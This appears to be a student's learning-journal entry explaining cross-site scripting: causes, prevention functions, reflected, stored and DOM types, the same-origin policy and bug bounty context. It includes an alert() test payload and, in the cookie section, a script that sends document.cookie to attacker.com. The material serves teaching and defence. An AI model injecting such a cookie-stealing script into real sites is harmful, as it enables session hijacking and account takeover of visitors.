# Day 11 — XSS Cross Site Scripting

## 📌 What I Learned
XSS is a vulnerability where attackers
inject malicious JavaScript code into
a website that gets executed by
other users' browsers.

JavaScript is the programming language
used in web development — which is
why XSS is possible.

---

## ❓ What is XSS?


Attacker injects malicious code
into original web application
         ↓
New code loads the web page differently
         ↓
User visits the page
         ↓
Malicious code executes in user's browser
         ↓
Attacker steals their information!


---

## 🔴 Causes of XSS

| Cause | Meaning |
|-------|---------|
| No input validation | Not checking what user types |
| No sanitization | Not cleaning harmful code |
| No output encoding | Not converting code to safe text |
| Weak CSP | Content Security Policy too weak |

---

## 🔄 Vulnerable Code Pattern


Step 1: User inputs something
Step 2: Website takes that input
Step 3: Website prints it back
        on the page WITHOUT cleaning it

Result: Malicious code executes!


*Simple example:*

Normal input:
"Hello my name is Sara"

XSS input:
<script>alert('hacked')</script>

Vulnerable website prints it as code
Browser executes it!
Popup appears — or worse!


---

## 🛡️ How to Prevent XSS

Three operations should be performed
on ALL user input:


1. Validation  — Check the input
2. Sanitization — Clean harmful code
3. Encoding    — Convert to safe text


### Escape/Encode/Sanitize Functions

| Language | Function |
|----------|---------|
| PHP | htmlspecialchars() |
| Python Flask | escape() |
| ASP.NET | Html.Encode() |
| Node.js | sanitizeHtml() |

All basically say the same thing:
*Clean the user input before showing it!*

Converting <script> to &lt;script&gt;
means browser reads it as text
not as executable code!

---

## 📋 3 Types of XSS

### 1. Reflected XSS

Attacker crafts malicious link
Victim clicks the link
Code executes once
Page closes = nothing remains stored

Less dangerous — needs victim to click!

### 2. Stored XSS

Attacker injects code into
website database (comments, blogs etc)
Code stored permanently
Every visitor gets attacked automatically!
Page closing doesn't remove it!

Most dangerous — no click needed!
Affects every single visitor!

### 3. DOM Based XSS

Happens entirely in the browser
No server involvement
JavaScript manipulates the page directly
Advanced type


---

## 🍪 How XSS Steals Cookies

javascript
<script>
document.location=
'http://attacker.com/?cookie='
+document.cookie
</script>



Attacker injects this into website
         ↓
Victim just VISITS the page
         ↓
Browser automatically executes script
         ↓
Cookie sent to attacker silently
         ↓
Victim never knows!


*Why cookies matter:*

Cookie = your login session token
Attacker gets cookie =
Attacker logs in AS YOU
No password needed!
Full account takeover!


---

## 🔒 SOP — Same Origin Policy

SOP is a browser security rule that
limits what JavaScript can access.


A website's JavaScript can ONLY
access data from the SAME origin!


*Example:*

✅ bank.com can access data from bank.com
❌ facebook.com cannot access data from bank.com
❌ attacker.com cannot access bank.com data


*Why SOP matters for XSS:*

XSS bypasses SOP because
the malicious code is injected
INTO the trusted website itself!

Browser thinks it's bank.com code
So SOP allows it to run!
That's what makes XSS dangerous!


---

## 🔗 Connection to Bug Bounty


XSS is one of most reported bugs
on HackerOne and Bugcrowd!

Stored XSS payout: $200 — $5000
Reflected XSS payout: $100 — $2000

Where to look:
- Comment sections
- Search boxes
- Contact forms
- Profile fields
- Any input field!


---

## ⚠️ Important Note
All XSS practice on TryHackMe
authorized labs only.
Never test on systems
without written permission.
